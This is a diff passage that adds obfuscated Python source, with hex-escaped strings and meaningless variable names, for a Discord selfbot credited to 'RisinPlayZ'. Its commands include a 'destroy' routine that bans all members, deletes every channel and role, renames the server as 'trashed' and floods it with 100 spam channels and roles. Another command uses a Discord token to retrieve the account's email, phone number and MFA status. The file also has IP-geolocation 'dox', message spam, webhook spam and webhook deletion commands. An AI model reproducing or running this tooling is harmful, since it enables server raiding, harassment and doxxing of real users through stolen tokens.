+        O0OO0O0OO0O0O0OO0 .add_field (name ="\x3E\x77\x61\x74\x63\x68",value ="```\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x74\x61\x74\x75\x73\x20\x74\x6F\x20\x57\x61\x74\x63\x68\x69\x6E\x67\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x77\x61\x74\x63\x68\x20\x3C\x73\x74\x61\x74\x75\x73\x3E\x20\n\x45\x78\x2D\x20\x3E\x77\x61\x74\x63\x68\x20\x4E\x65\x74\x66\x6C\x69\x58```")#line:112
+        O0OO0O0OO0O0O0OO0 .add_field (name ="\x3E\x6C\x69\x73\x74\x65\x6E",value ="```\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x74\x61\x74\x75\x73\x20\x74\x6F\x20\x4C\x69\x73\x74\x65\x6E\x69\x6E\x67\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x3E\x6C\x69\x73\x74\x65\x6E\x20\x3C\x73\x74\x61\x74\x75\x73\x3E\x20\n\x45\x78\x2D\x20\x3E\x6C\x69\x73\x74\x65\x6E\x20\x46\x61\x6B\x65\x20\x53\x70\x6F\x74\x69\x66\x79\x20\x4F\x50```")#line:113
+        O0OO0O0OO0O0O0OO0 .add_field (name ="\x3E\x73\x74\x72\x65\x61\x6D",value ="```\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x74\x61\x74\x75\x73\x20\x74\x6F\x20\x50\x6C\x61\x79\x69\x6E\x67\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x70\x6C\x61\x79\x20\x3C\x73\x74\x61\x74\x75\x73\x3E\x20\n\x45\x78\x2D\x20\x3E\x73\x74\x72\x65\x61\x6D\x20\x31\x30\x30\x30\x20\x4D\x69\x6C\x6C\x69\x6F\x6E\x20\x53\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x20\x73\x70\x65\x63\x69\x61\x6C\x20\x6C\x69\x76\x65\x20\x73\x74\x72\x65\x61\x6D```")#line:114
+        O0OO0O0OO0O0O0OO0 .add_field (name ="\x3E\x73\x74\x6F\x70\x73\x74\x61\x74\x75\x73",value ="```\x53\x74\x6F\x70\x73\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x73\x74\x61\x74\x75\x73\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x74\x6F\x70\x73\x74\x61\x74\x75\x73\n\x45\x78\x2D\x20\x3E\x73\x74\x6F\x70\x73\x74\x61\x74\x75\x73```")#line:115
+        await O00OOOOO0OO00O0O0 .send (embed =O0OO0O0OO0O0O0OO0 )#line:116
+@SPYSBOP .command ()#line:118
+async def spam (O0O0O0000000000O0 ,O000O0O000OOO0000 :int ,*,message ):#line:119
+    for _O0O0O000OOOOO0OOO in range (O000O0O000OOO0000 ):#line:121
+        await O0O0O0000000000O0 .send (message )#line:122
+@SPYSBOP .command ()#line:124
+async def alive (O0OO0OOOOO0000O00 ):#line:125
+    await O0OO0OOOOO0000O00 .send (">>> **\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54**\nME IZ ALIVE OP\n\x57\x6F\x72\x6B\x69\x6E\x67\x20\x53\x74\x61\x74\x75\x73\x20\x2D\x20\x4C\x65\x67\x65\x6E\x64\x20\x6C\x76\x6C\x20\x6C\x69\x6B\x65\x20\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A\x20\x78\x44\nType help cmd to know more")#line:126
+@SPYSBOP .command ()#line:128
+async def securitynuke (O000OO0OO00OO0000 ):#line:129
+    await O000OO0OO00OO0000 .send ("\x3E\x72\x63\x20\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A\x20\x6F\x70")#line:130
+    await O000OO0OO00OO0000 .send ("\x3E\x72\x72\x20\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A\x20\x6F\x70")#line:131
+    await O000OO0OO00OO0000 .send ("\x3E\x73\x65\x72\x76\x65\x72\x6E\x61\x6D\x65\x20\x54\x52\x41\x53\x48\x45\x44\x20\x42\x59\x20\x52\x49\x53\x49\x4E\x50\x4C\x41\x59\x5A")#line:132
+    await O000OO0OO00OO0000 .send ("\x3E\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D")#line:133
+    await O000OO0OO00OO0000 .send ("\x3E\x70\x75\x72\x67\x65\x20\x35")#line:134
+@SPYSBOP .command (aliases =['doxip','iplookup','iptolocation','ip2geo','ip'])#line:137
+async def geoip (OO0000OO00000OO0O ,*,ipaddr :str ='1.3.3.7'):#line:138
+    O0OOOO0OOOO00000O =requests .get (f'http://extreme-ip-lookup.com/json/{ipaddr}')#line:139
+    OOO0O00OOO0OOOO00 =O0OOOO0OOOO00000O .json ()#line:140
+    OO0O000OO0000OO0O =discord .Embed ()#line:141
+    O0O0O0OO0O000OO00 =[{'name':'IP','value':OOO0O00OOO0OOOO00 ['query']},{'name':'Type','value':OOO0O00OOO0OOOO00 ['ipType']},{'name':'Country','value':OOO0O00OOO0OOOO00 ['country']},{'name':'City','value':OOO0O00OOO0OOOO00 ['city']},{'name':'Continent','value':OOO0O00OOO0OOOO00 ['continent']},{'name':'Country','value':OOO0O00OOO0OOOO00 ['country']},{'name':'Hostname','value':OOO0O00OOO0OOOO00 ['ipName']},{'name':'ISP','value':OOO0O00OOO0OOOO00 ['isp']},{'name':'Latitute','value':OOO0O00OOO0OOOO00 ['lat']},{'name':'Longitude','value':OOO0O00OOO0OOOO00 ['lon']},{'name':'Org','value':OOO0O00OOO0OOOO00 ['org']},{'name':'Region','value':OOO0O00OOO0OOOO00 ['region']},]#line:191
+    for O0OO0O0OOOOOO00OO in O0O0O0OO0O000OO00 :#line:192
+        if O0OO0O0OOOOOO00OO ['value']:#line:193
+            OO0O000OO0000OO0O .add_field (name =O0OO0O0OOOOOO00OO ['name'],value =O0OO0O0OOOOOO00OO ['value'],inline =True )#line:194
+    return await OO0000OO00000OO0O .send (embed =OO0O000OO0000OO0O )#line:196
+languages ={'hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}#line:219
+locales =["da","de","en-GB","en-US","es-ES","fr","hr","it","lt","hu","nl","no","pl","pt-BR","ro","fi","sv-SE","vi","tr","cs","el","bg","ru","uk","th","zh-CN","ja","zh-TW","ko"]#line:225
+@SPYSBOP .command ()#line:227
+async def dosip (OO000OO0O0000000O ):#line:228
+    await OO000OO0O0000000O .send ("\x53\x65\x6E\x64\x69\x6E\x67\x20\x52\x65\x71\x75\x65\x73\x74\x73\x2E\x2E\x2E\x2E\x2E")#line:229
+@SPYSBOP .command (aliases =['tdox','doxtoken'])#line:231
+async def tokeninfo (O0O00OO000O0OOO00 ,_O0OOOOO0O000O00OO ):#line:232
+    OOOO00O0O0O0OO000 ={'Authorization':_O0OOOOO0O000O00OO ,'Content-Type':'application/json'}#line:234
+    try :#line:235
+        OOO0OOO0000O0OO00 =requests .get ('\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x61\x6E\x61\x72\x79\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x76\x36\x2F\x75\x73\x65\x72\x73\x2F\x40\x6D\x65',headers =OOOO00O0O0O0OO000 )#line:237
+        OOO0OOO0000O0OO00 =OOO0OOO0000O0OO00 .json ()#line:238
+        O000000O000000000 =OOO0OOO0000O0OO00 ['id']#line:239
+        O0OOOOOO00OOO00O0 =OOO0OOO0000O0OO00 ['locale']#line:240
+        OOOO0OOO0O0O0OO00 =OOO0OOO0000O0OO00 ['avatar']#line:241
+        O0OOO0O0O0OOOO0O0 =languages .get (O0OOOOOO00OOO00O0 )#line:242
+        O0OOOO0OO0OO00O00 =datetime .datetime .utcfromtimestamp (((int (O000000O000000000 )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:245
+    except KeyError :#line:246
+        OOOO00O0O0O0OO000 ={'Authorization':"Bot "+_O0OOOOO0O000O00OO ,'Content-Type':'application/json'}#line:250
+        try :#line:251
+            OOO0OOO0000O0OO00 =requests .get ('\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x61\x6E\x61\x72\x79\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x76\x36\x2F\x75\x73\x65\x72\x73\x2F\x40\x6D\x65',headers =OOOO00O0O0O0OO000 )#line:254
+            OOO0OOO0000O0OO00 =OOO0OOO0000O0OO00 .json ()#line:255
+            O000000O000000000 =OOO0OOO0000O0OO00 ['id']#line:256
+            O0OOOOOO00OOO00O0 =OOO0OOO0000O0OO00 ['locale']#line:257
+            OOOO0OOO0O0O0OO00 =OOO0OOO0000O0OO00 ['avatar']#line:258
+            O0OOO0O0O0OOOO0O0 =languages .get (O0OOOOOO00OOO00O0 )#line:259
+            O0OOOO0OO0OO00O00 =datetime .datetime .utcfromtimestamp (((int (O000000O000000000 )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:262
+            O000O0O00OOO00O0O =discord .Embed (description =f"Name: `{OOO0OOO0000O0OO00['username']}#{OOO0OOO0000O0OO00['discriminator']} ` **BOT**\nID: `{OOO0OOO0000O0OO00['id']}`\nEmail: `{OOO0OOO0000O0OO00['email']}`\nCreation Date: `{O0OOOO0OO0OO00O00}`")#line:266
+            O00O00O0O0O00O0OO =[{'name':'Flags','value':OOO0OOO0000O0OO00 ['flags']},{'name':'Local language','value':OOO0OOO0000O0OO00 ['locale']+f"{O0OOO0O0O0OOOO0O0}"},{'name':'Verified','value':OOO0OOO0000O0OO00 ['verified']},]#line:280
+            for O00OO0OO000OOOOO0 in O00O00O0O0O00O0OO :#line:281
+                if O00OO0OO000OOOOO0 ['value']:#line:282
+                    O000O0O00OOO00O0O .add_field (name =O00OO0OO000OOOOO0 ['name'],value =O00OO0OO000OOOOO0 ['value'],inline =False )#line:284
+                    O000O0O00OOO00O0O .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O000000O000000000}/{OOOO0OOO0O0O0OO00}")#line:288
+            return await O0O00OO000O0OOO00 .send (embed =O000O0O00OOO00O0O )#line:289
+        except KeyError :#line:290
+            await O0O00OO000O0OOO00 .send ("\x49\x6E\x76\x61\x6C\x69\x64\x20\x54\x6F\x6B\x65\x6E\x2C\x20\x74\x72\x79\x20\x64\x6F\x78\x69\x6E\x67\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x74\x6F\x6B\x65\x6E\x2E\x2E")#line:291
+    O000O0O00OOO00O0O =discord .Embed (description =f"Name: `{OOO0OOO0000O0OO00['username']}#{OOO0OOO0000O0OO00['discriminator']}`\nID: `{OOO0OOO0000O0OO00['id']}`\nEmail: `{OOO0OOO0000O0OO00['email']}`\nCreation Date: `{O0OOOO0OO0OO00O00}`")#line:295
+    O000O0O00OOO00O0O .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:296
+    O0OOO0O0O0000OO0O ="None"#line:297
+    if "premium_type"in OOO0OOO0000O0OO00 :#line:298
+        if OOO0OOO0000O0OO00 ['premium_type']==2 :#line:299
+            O0OOO0O0O0000OO0O ="Nitro Premium"#line:300
+        elif OOO0OOO0000O0OO00 ['premium_type']==1 :#line:301
+            O0OOO0O0O0000OO0O ="Nitro Classic"#line:302
+    O00O00O0O0O00O0OO =[{'name':'Phone','value':OOO0OOO0000O0OO00 ['phone']},{'name':'Flags','value':OOO0OOO0000O0OO00 ['flags']},{'name':'Local language','value':OOO0OOO0000O0OO00 ['locale']+f"{O0OOO0O0O0OOOO0O0}"},{'name':'MFA','value':OOO0OOO0000O0OO00 ['mfa_enabled']},{'name':'Verified','value':OOO0OOO0000O0OO00 ['verified']},{'name':'Nitro','value':O0OOO0O0O0000OO0O },]#line:328
+    for O00OO0OO000OOOOO0 in O00O00O0O0O00O0OO :#line:329
+        if O00OO0OO000OOOOO0 ['value']:#line:330
+            O000O0O00OOO00O0O .add_field (name =O00OO0OO000OOOOO0 ['name'],value =O00OO0OO000OOOOO0 ['value'],inline =False )#line:332
+            O000O0O00OOO00O0O .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O000000O000000000}/{OOOO0OOO0O0O0OO00}")#line:335
+            O000O0O00OOO00O0O .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:336
+    return await O0O00OO000O0OOO00 .send (embed =O000O0O00OOO00O0O )#line:337
+def RandomColor ():#line:345
+    O0OO0000000OO00OO =discord .Color (random .randint (0x000000 ,0xFFFFFF ))#line:346
+    return O0OO0000000OO00OO #line:347
+@SPYSBOP .command (aliases =["trash","wizz"])#line:349
+async def destroy (OO000O0000000OO00 ):#line:350
+    for OOOOOO00O0O0O00O0 in list (OO000O0000000OO00 .guild .members ):#line:352
+        try :#line:353
+            await OOOOOO00O0O0O00O0 .ban ()#line:354
+        except :#line:355
+            pass #line:356
+    for O000OOOO000O00O00 in list (OO000O0000000OO00 .guild .channels ):#line:357
+        try :#line:358
+            await O000OOOO000O00O00 .delete ()#line:359
+        except :#line:360
+            pass #line:361
+    for OO0OOO00O00OOO000 in list (OO000O0000000OO00 .guild .roles ):#line:362
+        try :#line:363
+            await OO0OOO00O00OOO000 .delete ()#line:364
+        except :#line:365
+            pass #line:366
+    try :#line:367
+        await OO000O0000000OO00 .guild .edit (name ="\x54\x52\x41\x53\x48\x45\x44\x20\x42\x59\x20\x52\x49\x53\x49\x4E\x50\x4C\x41\x59\x5A",description ="\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x67\x6F\x74\x20\x6E\x6F\x20\x63\x68\x69\x6C\x6C",reason ="\x72\x69\x70\x70\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A",icon =None ,banner =None )#line:373
+    except :#line:374
+        pass #line:375
+    for _O00OO0OO0O00OO000 in range (100 ):#line:376
+        await OO000O0000000OO00 .guild .create_text_channel (name ="\x77\x69\x7A\x7A\x65\x64\x2D\x62\x79\x2D\x73\x70\x79")#line:377
+    for _O00OO0OO0O00OO000 in range (100 ):#line:378
+        await OO000O0000000OO00 .guild .create_role (name ="\x6E\x75\x6B\x65\x64\x2D\x62\x79\x2D\x73\x70\x79",color =RandomColor ())#line:379
+format ="%a, %d %b %Y | %H:%M:%S %ZGMT"#line:384
+@SPYSBOP .command ()#line:386
+@commands .guild_only ()#line:387
+async def doxserver (OOOOO0OO0000000O0 ):#line:388
+    OO0O00OO0O00000O0 =discord .Embed ()#line:390
+    O000O00O00OOOO0OO =len (OOOOO0OO0000000O0 .guild .text_channels )#line:391
+    OOO00O0O0OO0OO0OO =len (OOOOO0OO0000000O0 .guild .voice_channels )#line:392
+    OOO0OO0OOOO000000 =len (OOOOO0OO0000000O0 .guild .categories )#line:393
+    OO0O00O0OO0O0OO0O =O000O00O00OOOO0OO +OOO00O0O0OO0OO0OO #line:394
+    OO0O00OO0O00000O0 .set_thumbnail (url =str (OOOOO0OO0000000O0 .guild .icon_url ))#line:395
+    OO0O00OO0O00000O0 .add_field (name =f"Information About **{OOOOO0OO0000000O0.guild.name}**: ",value =f":white_small_square: ID: **{OOOOO0OO0000000O0.guild.id}** \n:white_small_square: Owner: **{OOOOO0OO0000000O0.guild.owner}** \n:white_small_square: Location: **{OOOOO0OO0000000O0.guild.region}** \n:white_small_square: Creation: **{OOOOO0OO0000000O0.guild.created_at.strftime(format)}** \n:white_small_square: Members: **{OOOOO0OO0000000O0.guild.member_count}** \n:white_small_square: Channels: **{OO0O00O0OO0O0OO0O}** Channels; **{O000O00O00OOOO0OO}** Text, **{OOO00O0O0OO0OO0OO}** Voice, **{OOO0OO0OOOO000000}** Categories \n:white_small_square: Verification: **{str(OOOOO0OO0000000O0.guild.verification_level).upper()}** \n:white_small_square: Features: {', '.join(f'**{OO00O00000000000O}**' for OO00O00000000000O in OOOOO0OO0000000O0.guild.features)} \n:white_small_square: Splash: {OOOOO0OO0000000O0.guild.splash}")#line:396
+    OO0O00OO0O00000O0 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:397
+    await OOOOO0OO0000000O0 .send (embed =OO0O00OO0O00000O0 )#line:398
+@SPYSBOP .command (aliases =['killwebhook'])#line:400
+async def delwebhook (OO000OO0OO00OOOOO ,O0O0OOOO0000O0O0O =None ):#line:401
+    if O0O0OOOO0000O0O0O ==None :#line:402
+        OO000OOOOO00O00OO =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54",description ="```\x3E\x64\x65\x6C\x77\x65\x62\x68\x6F\x6F\x6B\x20\x3C\x77\x65\x62\x68\x6F\x6F\x6B\x3E```")#line:403
+        OO000OOOOO00O00OO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:404
+        await OO000OO0OO00OOOOO .send (content ="",embed =OO000OOOOO00O00OO )#line:405
+    else :#line:406
+        OO000OOOOO00O00OO =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54",description =f"Sending a delete request to\n{O0O0OOOO0000O0O0O}")#line:407
+        OO000OOOOO00O00OO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:408
+        await OO000OO0OO00OOOOO .send (content ="",embed =OO000OOOOO00O00OO )#line:409
+        OO0O00O0OOOOO0OOO =requests .delete (O0O0OOOO0000O0O0O )#line:412
+        if OO0O00O0OOOOO0OOO .status_code ==204 :#line:414
+            OO000OOOOO00O00OO =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54",description =f"\x57\x45\x42\x48\x4F\x4F\x4B\x20\x44\x45\x4C\x45\x54\x45\x44")#line:415
+            OO000OOOOO00O00OO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:416
+            await OO000OO0OO00OOOOO .send (embed =OO000OOOOO00O00OO )#line:417
+        else :#line:418
+            OO000OOOOO00O00OO =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x20\x42\x4F\x54",description =f"Delete request responded with status code : {OO0O00O0OOOOO0OOO.status_code}\{OO0O00O0OOOOO0OOO.text}")#line:419
+            OO000OOOOO00O00OO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:420
+            await OO000OO0OO00OOOOO .send (embed =OO000OOOOO00O00OO )#line:421
+@SPYSBOP .command ()#line:423
+async def purge (OO0OOO0O0O00OOO00 ,O000OOO0OO0OOOO00 :int =None ):#line:424
+    await OO0OOO0O0O00OOO00 .message .delete ()#line:425
+    if O000OOO0OO0OOOO00 is None :#line:426
+        async for OO00O0OO0OO000000 in OO0OOO0O0O00OOO00 .message .channel .history (limit =999 ).filter (lambda O00O0OO00O00000O0 :O00O0OO00O00000O0 .author ==SPYSBOP .user ).map (lambda OO0OO00OOO0OO0000 :OO0OO00OOO0OO0000 ):#line:428
+            try :#line:429
+                await OO00O0OO0OO000000 .delete ()#line:430
+            except :#line:431
+                pass #line:432
+    else :#line:433
+        async for OO00O0OO0OO000000 in OO0OOO0O0O00OOO00 .message .channel .history (limit =O000OOO0OO0OOOO00 ).filter (lambda OOO00OOO000O0OOO0 :OOO00OOO000O0OOO0 .author ==SPYSBOP .user ).map (lambda OOOOOO00O00OOO00O :OOOOOO00O00OOO00O ):#line:435
+            try :#line:436
+                await OO00O0OO0OO000000 .delete ()#line:437
+            except :#line:438
+                pass #line:439
+@SPYSBOP .command ()#line:441
+async def av (OO0OOOO0OO0000O00 ,*,avamember ):#line:442
+    O000OOO00OOO0O0OO =SPYSBOP .get_user (avamember )#line:443
+    await OO0OOOO0OO0000O00 .send (f"{O000OOO00OOO0O0OO.avatar_url}")#line:444
+@SPYSBOP .command ()#line:446
+async def pingweb (O0O00O0O0OO00O00O ,OO0O00O0OO00O0000 =None ):#line:447
+    await O0O00O0O0OO00O00O .send (f'Pinging {OO0O00O0OO00O0000} with 32 bytes of data:')#line:448
+    if OO0O00O0OO00O0000 is None :#line:449
+        pass #line:450
+    else :#line:451
+        try :#line:452
+            OO0O00OO000000O00 =requests .get (OO0O00O0OO00O0000 ).status_code #line:453
+        except Exception as OO00O0OOOO0O00000 :#line:454
+            print (f"{Fore.RED}[ERROR]: {Fore.YELLOW}{OO00O0OOOO0O00000}"+Fore .RESET )#line:455
+        if OO0O00OO000000O00 ==404 :#line:456
+            await O0O00O0O0OO00O00O .send (f'Website is down, status = ({OO0O00OO000000O00})')#line:457
+        else :#line:458
+            await O0O00O0O0OO00O00O .send (f'Website is operational, status = ({OO0O00OO000000O00})')#line:459
+            await O0O00O0O0OO00O00O .send ("\x54\x69\x6D\x65\x64\x20\x6F\x75\x74\x2E")#line:460
+@SPYSBOP .command ()#line:462
+async def ping (OOOO00OO0OO0O0O00 ,OOO0OO000O000O00O =None ):#line:463
+    await OOOO00OO0OO0O0O00 .send (f'Pinging {OOO0OO000O000O00O} with 32 bytes of data:')#line:464
+    await OOOO00OO0OO0O0O00 .send ("\x54\x69\x6D\x65\x64\x20\x6F\x75\x74\x2E")#line:465
+@SPYSBOP .command (aliases =["whois"])#line:467
+async def doxuser (O00O00OOOOOO00OO0 ,O0O00000O000OOOO0 :discord .Member =None ):#line:468
+    if not O0O00000O000OOOO0 :#line:469
+        O0O00000O000OOOO0 =O00O00OOOOOO00OO0 .message .author #line:470
+    O0O0O000OOOO0OOOO =[OO00O0O0OO0O0OOOO for OO00O0O0OO0O0OOOO in O0O00000O000OOOO0 .roles ]#line:471
+    O000OO000O00OO0OO =discord .Embed (colour =discord .Colour .default (),timestamp =O00O00OOOOOO00OO0 .message .created_at ,title =f"User Info - {O0O00000O000OOOO0}")#line:473
+    O000OO000O00OO0OO .set_thumbnail (url =O0O00000O000OOOO0 .avatar_url )#line:474
+    O000OO000O00OO0OO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:475
+    O000OO000O00OO0OO .add_field (name ="\x49\x44\x3A",value =O0O00000O000OOOO0 .id )#line:477
+    O000OO000O00OO0OO .add_field (name ="\x44\x69\x73\x70\x6C\x61\x79\x20\x4E\x61\x6D\x65\x3A",value =O0O00000O000OOOO0 .display_name )#line:478
+    O000OO000O00OO0OO .add_field (name ="\x43\x72\x65\x61\x74\x65\x64\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x4F\x6E\x3A",value =O0O00000O000OOOO0 .created_at .strftime ("%a, %d %B %Y, %I:%M %p UTC"))#line:480
+    O000OO000O00OO0OO .add_field (name ="\x4A\x6F\x69\x6E\x65\x64\x20\x53\x65\x72\x76\x65\x72\x20\x4F\x6E\x3A",value =O0O00000O000OOOO0 .joined_at .strftime ("%a, %d %B %Y, %I:%M %p UTC"))#line:481
+    O000OO000O00OO0OO .add_field (name ="\x52\x6F\x6C\x65\x73\x3A",value ="".join ([O0000000OOO000000 .mention for O0000000OOO000000 in O0O0O000OOOO0OOOO ]))#line:483
+    O000OO000O00OO0OO .add_field (name ="\x48\x69\x67\x68\x65\x73\x74\x20\x52\x6F\x6C\x65\x3A",value =O0O00000O000OOOO0 .top_role .mention )#line:484
+    print (O0O00000O000OOOO0 .top_role .mention )#line:485
+    await O00O00OOOOOO00OO0 .send (embed =O000OO000O00OO0OO )#line:486
+@SPYSBOP .command (aliases =["roles"])#line:488
+async def getroles (OO0O00OOO00000O0O ):#line:489
+    O00OOO0O00O0OOOO0 =list (OO0O00OOO00000O0O .guild .roles )#line:491
+    O00OOO0O00O0OOOO0 .reverse ()#line:492
+    OO0OOO0000000OOOO =""#line:493
+    for O0000O0OO0OO0000O in O00OOO0O00O0OOOO0 :#line:494
+        if O0000O0OO0OO0000O .name =="@everyone":#line:495
+            OO0OOO0000000OOOO +="@\u200beveryone"#line:496
+        else :#line:497
+            OO0OOO0000000OOOO +=O0000O0OO0OO0000O .name +"\n"#line:498
+    print (OO0OOO0000000OOOO )#line:499
+    await OO0O00OOO00000O0O .send (OO0OOO0000000OOOO )#line:500
+@SPYSBOP .command (aliases =["renameserver","nameserver"])#line:502
+async def servername (OO000OO00O0000OOO ,*,name ):#line:503
+    await OO000OO00O0000OOO .message .delete ()#line:504
+    await OO000OO00O0000OOO .guild .edit (name =name )#line:505
+stream_url ="https://twitch.tv/risinplayz"#line:509
+@SPYSBOP .command (aliases =["streaming"])#line:510
+async def stream (O00O0OO00O0O00OO0 ,*,message ):#line:511
+    await O00O0OO00O0O00OO0 .send ("\x43\x68\x61\x6E\x67\x69\x6E\x67\x20\x53\x74\x61\x74\x75\x73\x2E\x2E\x2E\x2E\x2E")#line:512
+    OOOOO0O0OOO0OO00O =discord .Streaming (name =message ,url =stream_url ,)#line:516
+    await SPYSBOP .change_presence (activity =OOOOO0O0OOO0OO00O )#line:517
+    await O00O0OO00O0O00OO0 .send ("Streaming \x63\x72\x65\x61\x74\x65\x64\x21")#line:518
+@SPYSBOP .command (alises =["play"])#line:520
+async def playing (OOO000OO00000OO0O ,*,message ):#line:521
+    await OOO000OO00000OO0O .send ("\x43\x68\x61\x6E\x67\x69\x6E\x67\x20\x53\x74\x61\x74\x75\x73\x2E\x2E\x2E\x2E\x2E")#line:522
+    O0000OO0OOO00O0O0 =discord .Game (name =message )#line:523
+    await SPYSBOP .change_presence (activity =O0000OO0OOO00O0O0 )#line:524
+    await OOO000OO00000OO0O .send ("Playing \x63\x72\x65\x61\x74\x65\x64\x21")#line:525
+@SPYSBOP .command (aliases =["watch"])#line:527
+async def watching (O0O00O00OOOO000OO ,*,message ):#line:528
+    await O0O00O00OOOO000OO .send ("\x43\x68\x61\x6E\x67\x69\x6E\x67\x20\x53\x74\x61\x74\x75\x73\x2E\x2E\x2E\x2E\x2E")#line:529
+    await SPYSBOP .change_presence (activity =discord .Activity (type =discord .ActivityType .watching ,name =message ))#line:532
+    await O0O00O00OOOO000OO .send ("Watching \x63\x72\x65\x61\x74\x65\x64\x21")#line:533
+@SPYSBOP .command (aliases =["listen"])#line:535
+async def listening (OO000OO0OOOO00OOO ,*,message ):#line:536
+    await OO000OO0OOOO00OOO .send ("\x43\x68\x61\x6E\x67\x69\x6E\x67\x20\x53\x74\x61\x74\x75\x73\x2E\x2E\x2E\x2E\x2E")#line:537
+    await SPYSBOP .change_presence (activity =discord .Activity (type =discord .ActivityType .listening ,name =message ,))#line:542
+    await OO000OO0OOOO00OOO .send ("Listening \x63\x72\x65\x61\x74\x65\x64\x21")#line:543
+@SPYSBOP .command (aliases =["spamchangegcname","changegcname"])#line:548
+async def spamgcname (O000OO0000O0O0O0O ):#line:549
+    if isinstance (O000OO0000O0O0O0O .message .channel ,discord .GroupChannel ):#line:551
+        O0O0OO0O00OOOO000 ="\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x4F\x50"#line:552
+        OOOO000O0000OOOO0 =""#line:553
+        for O0OO0O0O0000O0O00 in O0O0OO0O00OOOO000 :#line:554
+            OOOO000O0000OOOO0 =OOOO000O0000OOOO0 +O0OO0O0O0000O0O00 #line:555
+            await O000OO0000O0O0O0O .message .channel .edit (name =OOOO000O0000OOOO0 )#line:556
+@SPYSBOP .command (name ='first-message',aliases =['firstmsg','fm','firstmessage'])#line:559
+async def _OOO00O0O0O0000OO0 (OOO0OO0OOO000O00O ,O00O00O000O00O00O :discord .TextChannel =None ):#line:560
+    if O00O00O000O00O00O is None :#line:562
+        O00O00O000O00O00O =OOO0OO0OOO000O00O .channel #line:563
+    OO0O0000O0OO0OO0O =(await O00O00O000O00O00O .history (limit =1 ,oldest_first =True ).flatten ())[0 ]#line:565
+    O00000OOOO0000OO0 =discord .Embed (description =OO0O0000O0OO0OO0O .content )#line:566
+    O00000OOOO0000OO0 .add_field (name ="\x46\x69\x72\x73\x74\x20\x4D\x65\x73\x73\x61\x67\x65",value =f"[Click here to Jump]({OO0O0000O0OO0OO0O.jump_url})")#line:568
+    O00000OOOO0000OO0 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:569
+    await OOO0OO0OOO000O00O .send (embed =O00000OOOO0000OO0 )#line:570
+def ssspam (OOO0O0O0O0O0OO00O ):#line:572
+    global spammingdawebhookeroos #line:573
+    while spammingdawebhookeroos :#line:574
+        OO0O0OO0OO0O0OO0O =random .randint (0x000000 ,0xFFFFFF )#line:576
